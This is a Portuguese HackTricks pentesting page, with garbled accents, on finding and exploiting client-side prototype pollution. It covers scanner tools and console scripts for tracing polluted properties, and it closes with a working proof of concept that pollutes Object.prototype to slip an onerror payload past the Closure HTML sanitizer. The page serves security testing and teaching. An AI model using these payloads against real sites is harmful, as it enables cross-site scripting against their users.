# Polui√ß√£o de Prot√≥tipo do Lado do Cliente

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descobrindo usando ferramentas autom√°ticas

As ferramentas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **e** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) podem ser usadas para **encontrar vulnerabilidades de polui√ß√£o de prot√≥tipo**.

Al√©m disso, voc√™ tamb√©m pode usar a **extens√£o do navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear automaticamente** as **p√°ginas** que voc√™ **acessa** em busca de vulnerabilidades de polui√ß√£o de prot√≥tipo.

### Depurando onde uma propriedade √© usada <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Encontrando a causa raiz da Polui√ß√£o de Prot√≥tipos <a href="#5530" id="5530"></a>

Uma vez que qualquer uma das ferramentas tenha **identificado** uma **vulnerabilidade de polui√ß√£o de prot√≥tipos**, se o **c√≥digo** n√£o for muito **complexo**, voc√™ pode **procurar** o c√≥digo JS pelas **palavras-chave** **`location.hash/decodeURIComponent/location.search`** no Chrome Developer Tools e encontrar o local vulner√°vel.

Se o c√≥digo for grande e complexo, h√° uma maneira f√°cil de **descobrir onde est√° o c√≥digo vulner√°vel**:

* Usando uma das ferramentas, **encontre uma vulnerabilidade** e obtenha um **payload** que ir√° **definir uma propriedade** no construtor. No ppmap, voc√™ receber√° algo como: `constructor[prototype][ppmap]=reserved`
* Agora, defina um **ponto de interrup√ß√£o na primeira linha de c√≥digo JS** que ser√° executada na p√°gina e atualize a p√°gina com o payload para que a **execu√ß√£o seja pausada l√°**.
* Enquanto a execu√ß√£o do JS estiver pausada, **cole o seguinte script no console JS**. Este c√≥digo indicar√° quando a propriedade 'ppmap' for criada, para que voc√™ possa encontrar onde ela foi criada.
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
Volte para **Fontes** e clique em "Continuar a **execu√ß√£o** do script". Depois de fazer isso, todo o **javascript** ser√° **executado** e o ppmap ser√° polu√≠do novamente, como esperado. Com a ajuda do Snippet, podemos encontrar onde exatamente a propriedade ppmap est√° polu√≠da. Podemos **clicar** na **Pilha de Chamadas** e voc√™ encontrar√° **diferentes** **pilhas** onde a **polui√ß√£o** ocorreu.

Mas qual escolher? Na maioria das vezes, a Polui√ß√£o de Prot√≥tipo ocorre em bibliotecas Javascript, ent√£o procure a pilha que est√° anexada aos arquivos de biblioteca .js (olhe para o lado direito, assim como na imagem, para saber a qual ponto final a pilha est√° anexada). Neste caso, temos 2 pilhas nas linhas 4 e 6, logicamente escolheremos a 4¬™ linha porque essa linha √© a primeira vez em que a Polui√ß√£o ocorre, o que significa que essa linha √© a causa da vulnerabilidade. Clicar na pilha nos redirecionar√° para o c√≥digo vulner√°vel.

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrando Gadgets de Script

O gadget √© o **c√≥digo que ser√° explorado quando uma vulnerabilidade de PP for descoberta**.

Se a aplica√ß√£o for simples, podemos **procurar** por **palavras-chave** como **`srcdoc/innerHTML/iframe/createElement`** e revisar o c√≥digo-fonte e verificar se ele **leva √† execu√ß√£o de javascript**. √Äs vezes, as t√©cnicas mencionadas podem n√£o encontrar gadgets. Nesse caso, a revis√£o pura do c√≥digo-fonte revela alguns gadgets interessantes, como o exemplo abaixo.

### Exemplo de encontrar gadget de PP no c√≥digo da biblioteca Mithil

Verifique esta explica√ß√£o: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompila√ß√£o de payloads para bibliotecas vulner√°veis

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de Sanitizadores HTML via PP

[**Esta pesquisa**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) mostra gadgets de PP a serem usados para **burlar as sanitiza√ß√µes** fornecidas por algumas bibliotecas de sanitizadores HTML:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Refer√™ncias

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
